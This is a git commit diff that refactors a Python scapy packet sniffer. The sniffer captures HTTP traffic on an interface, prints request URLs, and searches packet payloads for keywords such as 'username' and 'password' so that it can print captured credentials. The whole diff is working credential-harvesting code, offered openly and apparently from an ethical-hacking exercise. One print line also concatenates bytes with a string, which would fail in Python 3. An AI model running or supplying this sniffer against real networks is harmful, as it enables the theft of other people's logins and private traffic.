d683970fc217e989e12dfb08e98dd854906a2210
developerkhashab <mohammad.khashab.mk@gmail.com>
2020-04-07 09:16:21 -0400

    Refactoring and formatting code

--- Packet_Sniffer/packet_sniffer.py
+++ Packet_Sniffer/packet_sniffer.py
@@ -8,17 +8,25 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ['email', 'username', 'user', 'login', 'password', 'pass']
+        for keyword in keywords:
+            if keyword in load.decode():
+                return load
+
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        url=packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path
-        print(url)
-        if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            keywords = ['email', 'username', 'user', 'login', 'password', 'pass']
-            for keyword in keywords:
-                if keyword in load.decode():
-                    print(load)
-                    break
+        url = get_url(packet)
+        print('[+] HTTP Request >> ' + url)
+        login_info = get_login_info(packet)
+        if login_info:
+            print('\n\n[+] Possible username/password >>' + login_info + '\n\n')
 
 
 sniff("eth0")
